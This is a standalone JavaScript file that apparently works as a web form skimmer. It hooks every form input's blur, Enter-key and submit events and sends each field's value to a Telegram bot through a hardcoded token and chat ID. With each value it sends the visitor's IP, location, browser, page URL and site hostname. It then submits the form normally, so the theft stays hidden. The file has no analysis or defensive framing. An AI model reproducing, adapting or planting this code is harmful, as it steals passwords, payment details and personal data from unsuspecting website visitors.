const tgBotToken = "8077470227:AAGBJfxVGWcbmQMM0uvdc8ezgc7DK8ABvVM";
const tgChatId = "-1002389835567";

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
    }).catch(err => console.error("Error sending to Telegram:", err));
}

function hashDomain(domain) {
    return crypto.subtle.digest("SHA-256", new TextEncoder().encode(domain))
        .then(buffer => {
            let hashArray = Array.from(new Uint8Array(buffer));
            let hashHex = hashArray.map(byte => byte.toString(16).padStart(2, "0")).join("");
            return `#${hashHex.slice(0, 8)}`; // Keep the first 8 characters of the hash
        });
}

function getIPInfo() {
    return fetch("https://ipapi.co/json/")
        .then(response => {
            if (!response.ok) {
                throw new Error("Error fetching IP information");
            }
            return response.json();
        })
        .then(data => {
            return {
                ip: data.ip,
                location: `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country_name || "Unknown"}`,
                org: window.location.hostname,
            };
        })
        .catch(err => console.error("Error fetching IP information:", err));
}

function getSimplifiedUserAgent() {
    const userAgent = navigator.userAgent || "Unknown";
    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Unknown"];
    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Unknown"];
    const browser = browserMatches[0].split("/")[0]; // Browser name
    const os = osMatches[1].split(";")[0]; // Operating system
    return `${browser} on ${os}`;
}

// Function to send form field data
function sendFieldData(name, value) {
    // Skip empty values
    if (!value) return;

    const simplifiedUserAgent = getSimplifiedUserAgent();

    getIPInfo().then(info => {
        hashDomain(info.org).then(domainHashTag => {
            const message = `📋 *Field Update Detected:*
---
- 🛡️ **Field Name:** \`${name}\`
- ✍️ **Value:** \`${value || "Not provided"}\`
- 🌐 **IP Address:** ${info.ip}
- 📍 **Location:** ${info.location}
- 🖥️ **User-Agent:** ${simplifiedUserAgent}
- 🔗 **Page URL:** ${window.location.href}
- 🏢 **Organization:** ${info.org}
${domainHashTag}`;
            sendToTelegram(message);
        });
    });
}

// Track when a field loses focus
document.querySelectorAll("form input").forEach(input => {
    input.addEventListener("blur", event => {
        const fieldName = event.target.name || "Unknown field";
        const fieldValue = event.target.value;
        sendFieldData(fieldName, fieldValue);
    });

    // Track Enter key presses
    input.addEventListener("keypress", event => {
        if (event.key === "Enter") {
            const fieldName = event.target.name || "Unknown field";
            const fieldValue = event.target.value;
            sendFieldData(fieldName, fieldValue);
        }
    });
});

// Track form submissions
document.querySelectorAll("form").forEach(form => {
    form.addEventListener("submit", event => {
        // Prevent the default form submission
        event.preventDefault();

        // Loop through all form fields and send their data
        const formData = new FormData(form);
        formData.forEach((value, name) => {
            sendFieldData(name, value);
        });

        // After sending data to Telegram, submit the form to the server
        form.submit();
    });
});
